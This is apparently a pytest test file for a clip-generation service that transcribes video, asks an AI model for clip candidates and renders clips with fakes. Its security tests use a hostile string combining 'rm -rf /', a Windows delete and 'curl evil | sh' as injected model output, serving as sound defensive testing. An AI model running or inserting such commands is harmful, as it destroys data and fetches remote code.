from __future__ import annotations

import inspect
import logging
from pathlib import Path
from typing import Any

import pytest

from app.ai.exceptions import AIResponseParseError, OllamaUnavailableError
from app.ai.models import ClipAnalysisResult, ClipCandidate
from app.clipping import service as service_module
from app.clipping.exceptions import (
    AnalysisStageError,
    ClipRenderError,
    InsufficientCandidatesError,
    InvalidJobRequestError,
    OutputVerificationError,
    SourceTooShortError,
    TranscriptionStageError,
)
from app.clipping.models import ClipJobRequest, JobStatus
from app.clipping.service import ClipGenerationService, clip_filename
from app.transcription.exceptions import TranscriptionFailedError
from app.transcription.models import TranscriptionResult, TranscriptSegment
from app.video.exceptions import FFmpegExecutionError, InvalidVideoError
from app.video.models import ProcessedVideo, VideoInfo

SOURCE_DURATION = 300.0
HOSTILE = "$(rm -rf /); del C:\\* & curl evil | sh"


def transcript() -> TranscriptionResult:
    return TranscriptionResult(
        source_file="src.mp4", language="en", language_probability=0.99, duration=SOURCE_DURATION,
        segments=[TranscriptSegment(start=0.0, end=5.0, text="hello world")], model_name="small",
    )


def cand(start: float, end: float, score: float, reason: str = "funny") -> ClipCandidate:
    return ClipCandidate(start=start, end=end, reason=reason, score=score, title=f"t{start:g}")


DISTINCT = [cand(10, 25, 0.9), cand(100, 120, 0.8), cand(200, 230, 0.7), cand(260, 290, 0.6)]


class FakeTranscriber:
    def __init__(self, error: Exception | None = None) -> None:
        self.error = error
        self.calls: list[str] = []

    def transcribe(self, input_path: str, language: str | None = None) -> TranscriptionResult:
        self.calls.append(input_path)
        if self.error:
            raise self.error
        return transcript()


class FakeAnalyzer:
    def __init__(self, candidates: list[ClipCandidate], error: Exception | None = None) -> None:
        self.candidates = candidates
        self.error = error
        self.instructions: list[str] = []

    def analyze(self, transcript: TranscriptionResult, instruction: str) -> ClipAnalysisResult:
        self.instructions.append(instruction)
        if self.error:
            raise self.error
        return ClipAnalysisResult(instruction, list(self.candidates), "qwen2.5:0.5b", transcript.duration)


class FakeVideo:
    """Writes real files like M04 would; can fail or misreport a given clip."""

    def __init__(self, source: Path, *, fail_at: int | None = None, bad_duration_at: int | None = None,
                 drop_audio_at: int | None = None, has_audio: bool = True, duration: float = SOURCE_DURATION):
        self.info = VideoInfo(str(source.resolve()), "mov", duration, 1280, 720, 30.0, "h264",
                              "aac" if has_audio else None, True, has_audio)
        self.fail_at = fail_at
        self.bad_duration_at = bad_duration_at
        self.drop_audio_at = drop_audio_at
        self.calls: list[tuple[Any, ...]] = []

    def probe(self, input_path: str | Path) -> VideoInfo:
        if not Path(input_path).exists():
            raise InvalidVideoError(str(input_path), "file does not exist")
        return self.info

    def extract_clip(self, input_path: str | Path, output_path: str | Path, start: float, duration: float,
                     overwrite: bool = False) -> ProcessedVideo:
        self.calls.append((input_path, output_path, start, duration, overwrite))
        n = len(self.calls)
        Path(output_path).parent.mkdir(parents=True, exist_ok=True)  # as M04 does
        if n == self.fail_at:
            raise FFmpegExecutionError(str(input_path), "Conversion failed!", 1)
        Path(output_path).write_bytes(b"mp4")
        actual = duration + (1.0 if n == self.bad_duration_at else 0.01)
        audio = None if n == self.drop_audio_at else self.info.audio_codec
        return ProcessedVideo(str(input_path), str(Path(output_path).resolve()), start, duration, actual,
                              1280, 720, 30.0, "h264", audio, 3)


@pytest.fixture
def src(tmp_path: Path) -> Path:
    f = tmp_path / "talk.mp4"
    f.write_bytes(b"video")
    return f


def make(src: Path, candidates: list[ClipCandidate] = DISTINCT, *, transcriber: FakeTranscriber | None = None,
         analyzer: FakeAnalyzer | None = None, **video_kw: Any) -> tuple[ClipGenerationService, FakeVideo, list[JobStatus]]:
    statuses: list[JobStatus] = []
    video = FakeVideo(src, **video_kw)
    svc = ClipGenerationService(
        transcriber=transcriber or FakeTranscriber(),
        analyzer=analyzer or FakeAnalyzer(candidates),
        video=video,
        on_status=lambda s, _d: statuses.append(s),
    )
    return svc, video, statuses


def request(src: Path, out: Path, count: int = 3, duration: float = 30.0, instruction: str = "funny") -> ClipJobRequest:
    return ClipJobRequest(str(src), str(out), count, duration, instruction)


def clip_files(out: Path) -> list[str]:
    return sorted(p.name for p in out.iterdir()) if out.exists() else []


class TestSuccess:
    def test_end_to_end_with_fakes(self, src: Path, tmp_path: Path) -> None:
        out = tmp_path / "job"
        svc, video, statuses = make(src)
        result = svc.generate(request(src, out, count=3))

        assert result.status is JobStatus.COMPLETED
        assert (result.requested_count, result.requested_duration) == (3, 30.0)
        assert [c.index for c in result.clips] == [1, 2, 3]
        assert [Path(c.path).name for c in result.clips] == ["clip_001.mp4", "clip_002.mp4", "clip_003.mp4"]
        assert clip_files(out) == ["clip_001.mp4", "clip_002.mp4", "clip_003.mp4"]
        assert [c.score for c in result.clips] == [0.9, 0.8, 0.7]
        first = result.clips[0]
        assert (first.start, first.end, first.candidate_start, first.candidate_end) == (2.5, 32.5, 10, 25)
        assert first.reason == "funny" and first.title == "t10"
        assert all(c.end - c.start == pytest.approx(30.0) for c in result.clips)
        assert result.candidates_returned == 4 and result.model_name == "qwen2.5:0.5b"
        assert statuses == [JobStatus.VALIDATING, JobStatus.TRANSCRIBING, JobStatus.ANALYZING, JobStatus.SELECTING,
                            JobStatus.GENERATING, JobStatus.VALIDATING_OUTPUTS, JobStatus.COMPLETED]
        assert all(call[4] is False for call in video.calls)  # never overwrite
        assert result.to_dict()["status"] == "completed"

    def test_exactly_requested_count_even_with_more_candidates(self, src: Path, tmp_path: Path) -> None:
        svc, video, _ = make(src)
        assert len(svc.generate(request(src, tmp_path / "o", count=2)).clips) == 2
        assert len(video.calls) == 2

    def test_existing_output_dir_without_conflicts_is_fine(self, src: Path, tmp_path: Path) -> None:
        out = tmp_path / "job"
        out.mkdir()
        (out / "notes.txt").write_text("keep")
        svc, _, _ = make(src)
        svc.generate(request(src, out, count=1))
        assert clip_files(out) == ["clip_001.mp4", "notes.txt"]


class TestFailuresBeforeWork:
    def test_missing_source(self, tmp_path: Path, src: Path) -> None:
        svc, _, statuses = make(src)
        with pytest.raises(InvalidJobRequestError, match="cannot use source"):
            svc.generate(request(tmp_path / "nope.mp4", tmp_path / "o"))
        assert statuses[-1] is JobStatus.FAILED

    def test_source_shorter_than_clip(self, src: Path, tmp_path: Path) -> None:
        transcriber = FakeTranscriber()
        svc, _, _ = make(src, transcriber=transcriber, duration=20.0)
        with pytest.raises(SourceTooShortError):
            svc.generate(request(src, tmp_path / "o", count=1, duration=30.0))
        assert transcriber.calls == []  # failed before expensive work

    def test_source_without_audio(self, src: Path, tmp_path: Path) -> None:
        svc, _, _ = make(src, has_audio=False)
        with pytest.raises(InvalidJobRequestError, match="no audio"):
            svc.generate(request(src, tmp_path / "o"))

    def test_existing_clip_file_is_not_overwritten(self, src: Path, tmp_path: Path) -> None:
        out = tmp_path / "job"
        out.mkdir()
        (out / "clip_002.mp4").write_bytes(b"precious")
        transcriber = FakeTranscriber()
        svc, video, _ = make(src, transcriber=transcriber)
        with pytest.raises(InvalidJobRequestError, match="clip_002.mp4"):
            svc.generate(request(src, out, count=3))
        assert (out / "clip_002.mp4").read_bytes() == b"precious"
        assert transcriber.calls == [] and video.calls == []

    def test_output_dir_is_a_file(self, src: Path, tmp_path: Path) -> None:
        svc, _, _ = make(src)
        with pytest.raises(InvalidJobRequestError, match="not a directory"):
            svc.generate(request(src, src))


class TestStageFailures:
    def test_transcription_failure(self, src: Path, tmp_path: Path) -> None:
        svc, video, statuses = make(src, transcriber=FakeTranscriber(TranscriptionFailedError("whisper crashed")))
        with pytest.raises(TranscriptionStageError) as exc:
            svc.generate(request(src, tmp_path / "o"))
        assert exc.value.stage is JobStatus.TRANSCRIBING
        assert isinstance(exc.value.__cause__, TranscriptionFailedError)
        assert video.calls == [] and statuses[-1] is JobStatus.FAILED

    @pytest.mark.parametrize("error", [OllamaUnavailableError(), AIResponseParseError("{bad", "not json")])
    def test_ai_failure(self, src: Path, tmp_path: Path, error: Exception) -> None:
        svc, video, _ = make(src, analyzer=FakeAnalyzer([], error))
        with pytest.raises(AnalysisStageError) as exc:
            svc.generate(request(src, tmp_path / "o"))
        assert exc.value.stage is JobStatus.ANALYZING and video.calls == []

    def test_insufficient_candidates_generates_nothing(self, src: Path, tmp_path: Path) -> None:
        out = tmp_path / "o"
        svc, video, _ = make(src, DISTINCT[:2])
        with pytest.raises(InsufficientCandidatesError, match="Only 2 .* requested 3"):
            svc.generate(request(src, out, count=3))
        assert video.calls == [] and clip_files(out) == []

    def test_no_fabricated_duplicates(self, src: Path, tmp_path: Path) -> None:
        same = [cand(50, 60, 0.9), cand(51, 61, 0.9), cand(50, 60, 0.8)]
        svc, video, _ = make(src, same)
        with pytest.raises(InsufficientCandidatesError) as exc:
            svc.generate(request(src, tmp_path / "o", count=2))
        assert exc.value.found == 1 and video.calls == []


class TestGenerationFailures:
    def test_video_failure_on_first_clip(self, src: Path, tmp_path: Path) -> None:
        out = tmp_path / "job"
        svc, _, statuses = make(src, fail_at=1)
        with pytest.raises(ClipRenderError) as exc:
            svc.generate(request(src, out))
        assert exc.value.index == 1 and exc.value.stage is JobStatus.GENERATING
        assert not out.exists()  # directory we created is removed again
        assert statuses[-1] is JobStatus.FAILED

    def test_partial_failure_removes_earlier_clips(self, src: Path, tmp_path: Path) -> None:
        out = tmp_path / "job"
        out.mkdir()
        (out / "other.mp4").write_bytes(b"not ours")
        svc, video, _ = make(src, fail_at=3)
        with pytest.raises(ClipRenderError, match="clip 3 failed"):
            svc.generate(request(src, out, count=4))
        assert len(video.calls) == 3
        assert clip_files(out) == ["other.mp4"]  # job's clips gone, user's file untouched

    def test_duration_verification_failure_cleans_up(self, src: Path, tmp_path: Path) -> None:
        out = tmp_path / "job"
        svc, _, _ = make(src, bad_duration_at=2)
        with pytest.raises(OutputVerificationError, match="clip 2 .*duration") as exc:
            svc.generate(request(src, out))
        assert exc.value.stage is JobStatus.VALIDATING_OUTPUTS
        assert clip_files(out) == []

    def test_lost_audio_verification_failure(self, src: Path, tmp_path: Path) -> None:
        svc, _, _ = make(src, drop_audio_at=1)
        with pytest.raises(OutputVerificationError, match="audio"):
            svc.generate(request(src, tmp_path / "o"))

    def test_within_tolerance_accepted(self, src: Path, tmp_path: Path) -> None:
        svc, _, _ = make(src)  # fake reports +0.01 s
        clips = svc.generate(request(src, tmp_path / "o", count=1)).clips
        assert clips[0].actual_duration == pytest.approx(30.01)


class TestSecurity:
    def test_model_text_never_reaches_video_engine(self, src: Path, tmp_path: Path) -> None:
        hostile = [cand(10, 25, 0.9, reason=HOSTILE), cand(100, 120, 0.8, reason=f"../../{HOSTILE}")]
        svc, video, _ = make(src, hostile)
        result = svc.generate(request(src, tmp_path / "o", count=2, instruction=HOSTILE))
        for input_path, output_path, start, duration, overwrite in video.calls:
            assert input_path == str(src.resolve())
            assert Path(output_path).parent == (tmp_path / "o").resolve()
            assert Path(output_path).name in {clip_filename(1), clip_filename(2)}
            assert type(start) is float and type(duration) is float and overwrite is False
        assert result.clips[0].reason == HOSTILE  # kept as data only

    def test_output_names_are_fixed_and_safe(self) -> None:
        assert clip_filename(1) == "clip_001.mp4"
        assert clip_filename(20) == "clip_020.mp4"

    def test_no_subprocess_or_shell_in_pipeline(self) -> None:
        source = inspect.getsource(service_module)
        assert "subprocess" not in source and "shell=" not in source and "os.system" not in source

    def test_errors_and_logs_bounded(self, src: Path, tmp_path: Path, caplog: pytest.LogCaptureFixture) -> None:
        secret_dump = "TRANSCRIPT " * 500
        svc, _, _ = make(src, analyzer=FakeAnalyzer([], AIResponseParseError(secret_dump, secret_dump)))
        with caplog.at_level(logging.DEBUG), pytest.raises(AnalysisStageError) as exc:
            svc.generate(request(src, tmp_path / "o"))
        assert len(str(exc.value)) < 400
        assert secret_dump not in caplog.text
